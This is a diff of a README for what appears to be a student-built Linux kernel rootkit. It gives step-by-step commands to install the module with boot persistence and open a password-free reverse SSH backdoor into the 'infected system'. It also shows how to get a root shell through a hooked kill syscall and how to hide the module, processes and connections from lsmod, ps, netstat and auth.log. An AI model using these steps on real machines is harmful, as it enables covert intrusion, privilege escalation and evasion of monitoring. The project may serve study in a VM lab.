@@ -62,13 +62,13 @@ The rootkit will make itself boot by editing `/modules/etc`, but you need to fol
 5. `sudo make all`
 6. `sudo depmod` which resets relevant systems to allow our module to be loaded on boot
 7. `sudo insmod rootkit.ko`
-8. To establish backdoor, go to `cd virus` and then run `./backdoor`. You will need to enter your home compyter's password for ssh key exchange
+8. To establish backdoor, go to `cd virus` and then run `./backdoor`. You will need to enter your home computer's password for ssh key exchange
 Warning: there is no way to remove the rootkit after this - if you want to recompile then either use signals to disable some functionality or reset your box.
 
 ### <u>Using backdoor</u>
 1. Whilst you have access to the system you are infecting, run the command `whoami` and make a note of the result that is produced. We will need this to ssh into the system
 2. We have set up a reverse ssh tunnel, meaning that whenever our router sees we are sending a request to `localhost` on port `7000` it will divert this to port `22` of our infected system
-3. To access the infected system, simply type the command `ssh targetUser@localhost -p 7000` and you will have access to their system without the need for their password
+3. To access the infected system, simply type the command `ssh targetUser@localhost -p 7000 -i ~/.ssh/id_rsa` and you will have access to their system without the need for their password
 
 ### <u>Showing Rootkit features</u>
 1. To see that our rootkit is not in modules list, run `sudo lsmod` and inspect the list
@@ -76,7 +76,4 @@ Warning: there is no way to remove the rootkit after this - if you want to recom
 3. To see that backdoor connections are hidden, we can run any networking command: `netstat`, `who`, `last`, `w`, `ss` and our ip address or any ssh connections will be hidden
 4. opening the `/var/log/auth.log` file will not show evidence of our ssh connection once the rootkit has been loaded
 5. To demonstrate root access, our payload program calls the hooked `kill` syscall when making a bash script. Running `./payload` or `./payload root` will give us a root terminal. This can be confirmed by running `whoami` 
-6. In order to demonstrate program hiding we have to options. First by running our `./payload` script in our `/rootkit/virus/` folder wil give us a bash terminal. Whilst running `ps` will show our payload process, if we ssh in again to the compromised VM and run `ps` from this terminal, we see that it is infact hidden. Second, we can find a process ID using `ps` or `top`, and then execute `./payload hidepid $PID` and this will hide any process.
-
-
-small programs cant be seen in `top` as dont use enough cpu. can see hiding processes though using `ps`. Execute `sleep 120 &` for demo program as payload doesnt run long enough
+6. In order to demonstrate program hiding we have to options. First by running our `./payload` script in our `/rootkit/virus/` folder wil give us a bash terminal. Whilst running `ps` or `top` will show our payload process, if we ssh in again to the compromised VM and run `ps` or `top` from this terminal, we see that it is infact hidden. Second, we can find a process ID using `ps` or `top`, and then execute `./payload hidepid $PID` and this will hide any process.
